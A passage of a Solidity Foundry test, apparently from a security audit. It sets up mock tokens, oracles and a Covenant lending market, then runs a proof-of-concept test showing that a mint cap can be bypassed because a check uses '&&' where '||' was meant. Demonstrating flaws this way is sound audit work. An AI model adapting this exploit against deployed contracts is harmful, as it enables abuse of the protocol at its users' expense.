  MockERC20(_mockBaseAsset).mint(address(this), 100e18);\n\n        // Deploy mock Quote Asset\n        _mockQuoteAsset = address(new MockERC20(address(this), \"MockQaseAsset\", \"MQA\", 18));\n\n        // Deploy Covenant\n        covenant = new Covenant(address(this));\n\n        // Deploy LEX implementation\n        lex = new LatentSwapLEX(\n            address(this),\n            address(covenant),\n            P_MAX,\n            P_MIN,\n            P_LIM_H,\n            P_LIM_MAX,\n            LN_RATE_BIAS,\n            DURATION,\n            SWAP_FEE\n        );\n\n        // Connect LEX w/ Covenant\n        covenant.setEnabledLEX(address(lex), true);\n\n        // Connect mock oracle w/ Covenant\n        covenant.setEnabledCurator(_mockOracle, true);\n\n        // Create a mock market\n        MarketParams memory marketParams = MarketParams({\n            baseToken: _mockBaseAsset,\n            quoteToken: _mockQuoteAsset,\n            curator: _mockOracle,\n            lex: address(lex)\n        });\n        _marketId = covenant.createMarket(marketParams, hex\"\");\n\n        // Deploy the Covenant Curator (Oracle Router)\n        covenantCurator = new CovenantCurator(address(this));\n\n        // Deploy a *stub* oracle for the Covenant Curator\n        covenantCuratorOracle = new StubPriceOracle();\n\n        // Link *stub* oracle with mock base and quote assets\n        covenantCurator.govSetConfig(_mockBaseAsset, _mockQuoteAsset, address(covenantCuratorOracle));\n\n        // Deploy mock Chainlink Aggregator\n        chainlinkAggregator = new MockChainlinkAggregator(8);\n\n        // Deploy Chainlink Oracle\n        chainlinkOracle = new ChainlinkOracle(_mockBaseAsset, _mockQuoteAsset, address(chainlinkAggregator), 1 hours);\n\n        // Deploy mock Pyth\n        pyth = new MockPyth();\n\n        // Deploy Pyth Oracle\n        pythOracle = new PythOracle(\n            address(pyth),\n            _mockBaseAsset,\n            _mockQuoteAsset,\n            bytes32(uint256(196)),\n            10 minutes,\n            250\n        );\n    }\n\n    function test_PoC_checkMintCap_logicFlaw() public {\n        // ARRANGE: Establish a small market by minting a small initial amount.\n        uint256 initialMintAmount = 1e18; // 1 token\n\n        // Approve and mint\n        MockERC20(_mockBaseAsset).approve(address(covenant), initialMintAmount);\n        covenant.mint(\n            MintParams({\n                marketId: _marketId,\n                marketParams: covenant.getIdToMarketParams(_marketId),\n                baseAmountIn: initialMintAmount,\n                to: address(this),\n                minATokenAmountOut: 0,\n                minZTokenAmountOut: 0,\n                data: hex\"\",\n                msgValue: 0\n            })\n        );\n\n        // Assert that the initial market supply is now 1e18\n        MarketState memory marketState_after_initial_mint = covenant.getMarketState(_marketId);\n        assertEq(marketState_after_initial_mint.baseSupply, initialMintAmount, \"Initial mint failed\");\n\n        // ACT: Attempt to mint an amount far greater than the current market supply.\n        // According to the intended logic (||), this should fail.\n        // Due to the flaw (&&), this will succeed.\n        uint256 exploitMintAmount = 10 * initialMintAmount; // 10 tokens\n\n        // Approve and mint\n        MockERC20(_mockBaseAsset).approve(address(covenant), exploitMintAmount);\n        covenant.mint(\n            MintParams({\n                marketId: _marketId,\n                marketParams: covenant.getIdToMarketParams(_marketId),\n                baseAmountIn: exploitMintAmount,\n                to: address(this),\n                minATokenAmountOut: 0,\n                minZTokenAmountOut: 0,\n                data: hex\"\",\n                msgValue: 0\n            })\n        );\n\n        // ASSERT: The exploit was successful. The base supply is now much larger.\n        MarketState memory marketState_after_exploit = covenant.getMarketState(_marketId);\n        uint256 expectedFinalSupply = initialMintAmount + exploitMintAmount;\n        assertEq(marketState_after_exploit.baseSupply, expectedFinalSupply, \"Exploit mint failed to increase supply\");\n\n        // The test passing proves the vulnerability. If the code were correct,\n        // the second mint would have reverted, and this test would fail.\n    }\n}\n```",
